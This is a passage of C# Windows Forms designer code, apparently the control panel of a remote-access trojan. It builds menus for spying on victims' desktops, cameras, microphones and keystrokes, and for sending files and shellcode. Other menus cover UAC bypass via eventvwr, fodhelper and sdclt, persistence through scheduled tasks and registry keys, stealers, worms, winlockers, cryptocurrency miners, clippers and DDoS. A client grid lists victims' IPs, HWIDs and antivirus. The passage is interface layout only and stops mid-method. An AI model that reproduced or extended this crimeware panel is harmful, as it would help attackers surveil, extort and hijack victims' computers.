		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
		this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.userInterfaceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.desktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.cameraToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.microphoneToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.systemSoundToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sToolStripMenuItem = new System.Windows.Forms.ToolStripSeparator();
		this.explorerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.regeditToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.autorunToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.deviceManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sToolStripMenuItem1 = new System.Windows.Forms.ToolStripSeparator();
		this.processToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.serviceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.netStatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.windowToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.programsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.performanceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sToolStripMenuItem2 = new System.Windows.Forms.ToolStripSeparator();
		this.shellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.fastRunToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sToolStripMenuItem3 = new System.Windows.Forms.ToolStripSeparator();
		this.mapToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem30 = new System.Windows.Forms.ToolStripMenuItem();
		this.keyLoggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.keyLoggerDownloadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.controlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sendFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.fromDiskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.fromMemoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.fromLinkToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.shellCodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.reverseProxyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.hVNCToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sToolStripMenuItem4 = new System.Windows.Forms.ToolStripSeparator();
		this.webSiteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.vIsbleToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.invisibleToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.processBlockToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.killToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.deadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.reportWindowToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.startToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.stopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.funToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.chatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.changeWallpaperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.volumeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.botSpeakerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.notepadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.hostFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.malwareToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.autoRunToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.startupToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem106 = new System.Windows.Forms.ToolStripMenuItem();
		this.schtaskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.regUserToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.regMachineToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.regUserinitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem114 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem115 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem116 = new System.Windows.Forms.ToolStripMenuItem();
		this.wormsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.stealthSaverToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.botKillerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.windowsExceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.pluginClearToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sToolStripMenuItem5 = new System.Windows.Forms.ToolStripSeparator();
		this.fileSearcherToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.stealerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem80 = new System.Windows.Forms.ToolStripMenuItem();
		this.sToolStripMenuItem9 = new System.Windows.Forms.ToolStripSeparator();
		this.keyLoggerSetupToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.keyLoggerUninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sToolStripMenuItem6 = new System.Windows.Forms.ToolStripSeparator();
		this.installNfx3ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.bSODToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.deletePointsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.resetScaleToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.winlockerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
		this.toolStripMenuItem15 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem16 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem17 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem9 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem10 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem14 = new System.Windows.Forms.ToolStripMenuItem();
		this.taskMgrToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.enableToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.disableToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem21 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem22 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem23 = new System.Windows.Forms.ToolStripMenuItem();
		this.sToolStripMenuItem10 = new System.Windows.Forms.ToolStripSeparator();
		this.toolStripMenuItem27 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem28 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem29 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem18 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem19 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem20 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem31 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem32 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem33 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem24 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem25 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem26 = new System.Windows.Forms.ToolStripMenuItem();
		this.bypassUacToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.runAsAdminUacToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.runAsSystemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sToolStripMenuItem7 = new System.Windows.Forms.ToolStripSeparator();
		this.eventvwrToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.fodhelperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.computerdefaultsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sDCLTToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sLUIToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.diskCleanupToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.systemControlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.exitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.exitToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.updateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.restartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.uninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.disconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.systemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.shutdownToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.restartToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.logOutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sToolStripMenuItem8 = new System.Windows.Forms.ToolStripSeparator();
		this.openClientFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.copyRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.noteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.MbSecound = new System.Windows.Forms.Timer(this.components);
		this.menuStrip2 = new System.Windows.Forms.MenuStrip();
		this.dataToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.buliderToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.settingsToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.aboutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem5 = new System.Windows.Forms.ToolStripSeparator();
		this.minerXMRToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.minerRigelToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.clipperPanelToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.dDOSPanelToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.proxyRPanelToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem6 = new System.Windows.Forms.ToolStripSeparator();
		this.exitToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem11 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem12 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem118 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem13 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
		this.users0ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem34 = new System.Windows.Forms.ToolStripMenuItem();
		this.connects0ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sents0mbToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.recives0mbToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.sents0mbsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.recives0mbsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.panel1 = new System.Windows.Forms.Panel();
		this.materialTabControl1 = new MaterialSkin.Controls.MaterialTabControl();
		this.tabPage1 = new System.Windows.Forms.TabPage();
		this.GridClients = new System.Windows.Forms.DataGridView();
		this.Column4 = new System.Windows.Forms.DataGridViewImageColumn();
		this.ColumnIP = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnCountry = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnGroup = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnHwid = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnUserPC = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnCamera = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnCpu = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnGpu = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnOs = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnAntiVirus = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnVersion = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnTimeInstall = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnPrivilege = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnPing = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnWindow = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.tabPage2 = new System.Windows.Forms.TabPage();
		this.GridLogs = new System.Windows.Forms.DataGridView();
		this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.contextMenuStrip2 = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.clearToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.tabPage3 = new System.Windows.Forms.TabPage();
		this.dataGridView2 = new System.Windows.Forms.DataGridView();
		this.Column5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.TS_Runs = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.TS_Name = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.contextMenuStrip3 = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.toolStripMenuItem41 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem74 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem75 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem76 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem77 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem78 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator7 = new System.Windows.Forms.ToolStripSeparator();
		this.toolStripMenuItem81 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem82 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem83 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem39 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem84 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem85 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem117 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem79 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem35 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem107 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem108 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem109 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem110 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem111 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem112 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem113 = new System.Windows.Forms.ToolStripMenuItem();
		this.processCriticalToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.setCriticalToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.exitCriticalToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem36 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem37 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem38 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem101 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
		this.toolStripMenuItem40 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem42 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
		this.toolStripMenuItem43 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem44 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem45 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem46 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
		this.toolStripMenuItem47 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem48 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem49 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem50 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem51 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem52 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem53 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem54 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem55 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem56 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem57 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem58 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator6 = new System.Windows.Forms.ToolStripSeparator();
		this.toolStripMenuItem59 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem60 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem61 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem62 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem63 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem64 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem65 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem66 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem67 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem68 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem69 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem70 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem71 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem72 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem73 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem86 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem87 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem88 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
		this.toolStripMenuItem89 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem90 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem91 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem92 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem93 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem94 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem95 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem96 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem97 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem98 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem99 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem100 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem102 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem103 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem104 = new System.Windows.Forms.ToolStripMenuItem();
		this.toolStripMenuItem105 = new System.Windows.Forms.ToolStripMenuItem();
		this.sToolStripMenuItem11 = new System.Windows.Forms.ToolStripSeparator();
		this.removeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.renameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.runOnceRunAllToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.contextMenuStrip1.SuspendLayout();
		this.menuStrip2.SuspendLayout();
		this.materialTabControl1.SuspendLayout();
		this.tabPage1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.GridClients).BeginInit();
		this.tabPage2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.GridLogs).BeginInit();
		this.contextMenuStrip2.SuspendLayout();
		this.tabPage3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.dataGridView2).BeginInit();
		this.contextMenuStrip3.SuspendLayout();
		base.SuspendLayout();
		this.contextMenuStrip1.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[9] { this.userInterfaceToolStripMenuItem, this.controlToolStripMenuItem, this.malwareToolStripMenuItem, this.bypassUacToolStripMenuItem1, this.systemControlToolStripMenuItem, this.sToolStripMenuItem8, this.openClientFolderToolStripMenuItem, this.copyRecoveryToolStripMenuItem, this.noteToolStripMenuItem });
		this.contextMenuStrip1.Name = "contextMenuStrip1";
		this.contextMenuStrip1.Size = new System.Drawing.Size(178, 186);
		this.userInterfaceToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[24]
		{
			this.desktopToolStripMenuItem, this.cameraToolStripMenuItem, this.microphoneToolStripMenuItem, this.systemSoundToolStripMenuItem, this.sToolStripMenuItem, this.explorerToolStripMenuItem, this.regeditToolStripMenuItem, this.autorunToolStripMenuItem, this.deviceManagerToolStripMenuItem, this.sToolStripMenuItem1,
			this.processToolStripMenuItem, this.serviceToolStripMenuItem, this.netStatToolStripMenuItem, this.windowToolStripMenuItem, this.programsToolStripMenuItem, this.performanceToolStripMenuItem, this.sToolStripMenuItem2, this.shellToolStripMenuItem, this.fastRunToolStripMenuItem, this.sToolStripMenuItem3,
			this.mapToolStripMenuItem, this.toolStripMenuItem30, this.keyLoggerToolStripMenuItem, this.keyLoggerDownloadToolStripMenuItem
		});
		this.userInterfaceToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("userInterfaceToolStripMenuItem.Image");
		this.userInterfaceToolStripMenuItem.Name = "userInterfaceToolStripMenuItem";
		this.userInterfaceToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.userInterfaceToolStripMenuItem.Text = "Surveillance";
		this.desktopToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("desktopToolStripMenuItem.Image");
		this.desktopToolStripMenuItem.Name = "desktopToolStripMenuItem";
		this.desktopToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.desktopToolStripMenuItem.Text = "Desktop";
		this.desktopToolStripMenuItem.Click += new System.EventHandler(desktopToolStripMenuItem_Click);
		this.cameraToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("cameraToolStripMenuItem.Image");
		this.cameraToolStripMenuItem.Name = "cameraToolStripMenuItem";
		this.cameraToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.cameraToolStripMenuItem.Text = "Camera";
		this.cameraToolStripMenuItem.Click += new System.EventHandler(cameraToolStripMenuItem_Click);
		this.microphoneToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("microphoneToolStripMenuItem.Image");
		this.microphoneToolStripMenuItem.Name = "microphoneToolStripMenuItem";
		this.microphoneToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.microphoneToolStripMenuItem.Text = "Microphone";
		this.microphoneToolStripMenuItem.Click += new System.EventHandler(microphoneToolStripMenuItem_Click);
		this.systemSoundToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("systemSoundToolStripMenuItem.Image");
		this.systemSoundToolStripMenuItem.Name = "systemSoundToolStripMenuItem";
		this.systemSoundToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.systemSoundToolStripMenuItem.Text = "System Sound";
		this.systemSoundToolStripMenuItem.Click += new System.EventHandler(systemSoundToolStripMenuItem_Click);
		this.sToolStripMenuItem.Name = "sToolStripMenuItem";
		this.sToolStripMenuItem.Size = new System.Drawing.Size(168, 6);
		this.explorerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("explorerToolStripMenuItem.Image");
		this.explorerToolStripMenuItem.Name = "explorerToolStripMenuItem";
		this.explorerToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.explorerToolStripMenuItem.Text = "Explorer";
		this.explorerToolStripMenuItem.Click += new System.EventHandler(explorerToolStripMenuItem_Click);
		this.regeditToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("regeditToolStripMenuItem.Image");
		this.regeditToolStripMenuItem.Name = "regeditToolStripMenuItem";
		this.regeditToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.regeditToolStripMenuItem.Text = "Regedit";
		this.regeditToolStripMenuItem.Click += new System.EventHandler(regeditToolStripMenuItem_Click);
		this.autorunToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("autorunToolStripMenuItem.Image");
		this.autorunToolStripMenuItem.Name = "autorunToolStripMenuItem";
		this.autorunToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.autorunToolStripMenuItem.Text = "Autorun";
		this.autorunToolStripMenuItem.Click += new System.EventHandler(autorunToolStripMenuItem_Click);
		this.deviceManagerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("deviceManagerToolStripMenuItem.Image");
		this.deviceManagerToolStripMenuItem.Name = "deviceManagerToolStripMenuItem";
		this.deviceManagerToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.deviceManagerToolStripMenuItem.Text = "Devices";
		this.deviceManagerToolStripMenuItem.Click += new System.EventHandler(deviceManagerToolStripMenuItem_Click);
		this.sToolStripMenuItem1.Name = "sToolStripMenuItem1";
		this.sToolStripMenuItem1.Size = new System.Drawing.Size(168, 6);
		this.processToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("processToolStripMenuItem.Image");
		this.processToolStripMenuItem.Name = "processToolStripMenuItem";
		this.processToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.processToolStripMenuItem.Text = "Process";
		this.processToolStripMenuItem.Click += new System.EventHandler(processToolStripMenuItem_Click);
		this.serviceToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("serviceToolStripMenuItem.Image");
		this.serviceToolStripMenuItem.Name = "serviceToolStripMenuItem";
		this.serviceToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.serviceToolStripMenuItem.Text = "Service";
		this.serviceToolStripMenuItem.Click += new System.EventHandler(serviceToolStripMenuItem_Click);
		this.netStatToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("netStatToolStripMenuItem.Image");
		this.netStatToolStripMenuItem.Name = "netStatToolStripMenuItem";
		this.netStatToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.netStatToolStripMenuItem.Text = "Netstat";
		this.netStatToolStripMenuItem.Click += new System.EventHandler(netStatToolStripMenuItem_Click);
		this.windowToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("windowToolStripMenuItem.Image");
		this.windowToolStripMenuItem.Name = "windowToolStripMenuItem";
		this.windowToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.windowToolStripMenuItem.Text = "Window";
		this.windowToolStripMenuItem.Click += new System.EventHandler(windowToolStripMenuItem_Click);
		this.programsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("programsToolStripMenuItem.Image");
		this.programsToolStripMenuItem.Name = "programsToolStripMenuItem";
		this.programsToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
		this.programsToolStripMenuItem.Text = "Programs";
